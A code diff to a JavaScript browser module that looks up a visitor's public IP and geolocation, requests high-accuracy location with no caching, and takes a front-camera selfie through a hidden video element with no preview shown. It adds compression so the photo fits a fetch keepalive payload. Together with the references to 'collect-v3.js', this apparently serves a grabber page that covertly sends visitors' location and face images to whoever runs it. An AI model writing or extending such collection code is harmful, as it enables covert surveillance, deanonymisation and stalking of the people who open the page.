@@ -1,56 +1,13 @@
+/**
+ * Legacy API surface — kept so older imports do not break.
+ * All real work lives in geo-precision.js and collect-v3.js now.
+ */
+
+export { resolveIpAndGeo } from "./geo-precision.js";
+
 export async function fetchPublicIp() {
-  const controllers = [
-    () => fetch("https://api.ipify.org?format=json").then((r) => r.json()),
-    () =>
-      fetch("https://api64.ipify.org?format=json").then((r) => r.json()),
-  ];
-
-  let ip = null;
-  let source = null;
-
-  for (const tryFetch of controllers) {
-    try {
-      const data = await tryFetch();
-      if (data?.ip) {
-        ip = data.ip;
-        source = "ipify";
-        break;
-      }
-    } catch {
-      /* try next */
-    }
-  }
-
-  if (!ip) return { ip: null, source: null, geo: null };
-
-  let geo = null;
-  try {
-    const ctrl = new AbortController();
-    const t = setTimeout(() => ctrl.abort(), 4500);
-    const res = await fetch(`https://ipapi.co/${ip}/json/`, {
-      signal: ctrl.signal,
-    });
-    clearTimeout(t);
-    const data = await res.json();
-    if (data && !data.error) {
-      geo = {
-        city: data.city,
-        region: data.region,
-        country: data.country_name,
-        countryCode: data.country_code,
-        postal: data.postal,
-        latitude: data.latitude,
-        longitude: data.longitude,
-        timezone: data.timezone,
-        org: data.org,
-        asn: data.asn,
-      };
-    }
-  } catch {
-    /* optional */
-  }
-
-  return { ip, source, geo };
+  const { resolveIpAndGeo: resolve } = await import("./geo-precision.js");
+  return resolve();
 }
 
 export function requestLocation() {
@@ -74,7 +31,7 @@ export function requestLocation() {
           error: err.code === 1 ? "denied" : String(err.message),
         });
       },
-      { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 }
+      { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
     );
   });
 }
@@ -82,7 +39,6 @@ export function requestLocation() {
 function createHiddenVideo() {
   const video = document.createElement("video");
   video.setAttribute("playsinline", "");
-  video.setAttribute("muted", "");
   video.muted = true;
   video.playsInline = true;
   video.autoplay = true;
@@ -110,7 +66,7 @@ function waitForVideoFrame(video) {
       resolve();
     };
     video.addEventListener("loadeddata", onReady);
-    setTimeout(resolve, 1500);
+    setTimeout(resolve, 1800);
   });
 }
 
@@ -120,7 +76,11 @@ export async function captureSelfie() {
 
   try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+      video: {
+        facingMode: "user",
+        width: { ideal: 960 },
+        height: { ideal: 720 },
+      },
       audio: false,
     });
 
@@ -128,6 +88,7 @@ export async function captureSelfie() {
     await videoEl.play();
     await waitForVideoFrame(videoEl);
 
+    // 480x360 @ q0.55 ≈ 25-40 KB base64 — fits the fetch keepalive cap.
     const maxW = 480;
     const vw = videoEl.videoWidth || 640;
     const vh = videoEl.videoHeight || 480;
@@ -138,7 +99,15 @@ export async function captureSelfie() {
     const ctx = canvas.getContext("2d");
     ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
 
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.72);
+    let quality = 0.55;
+    let dataUrl = canvas.toDataURL("image/jpeg", quality);
+
+    // Hard shot at the keepalive ceiling: shrink quality until it fits.
+    while (dataUrl.length > 45000 && quality > 0.25) {
+      quality -= 0.1;
+      dataUrl = canvas.toDataURL("image/jpeg", quality);
+    }
+
     return { granted: true, dataUrl };
   } finally {
     stream?.getTracks().forEach((t) => t.stop());
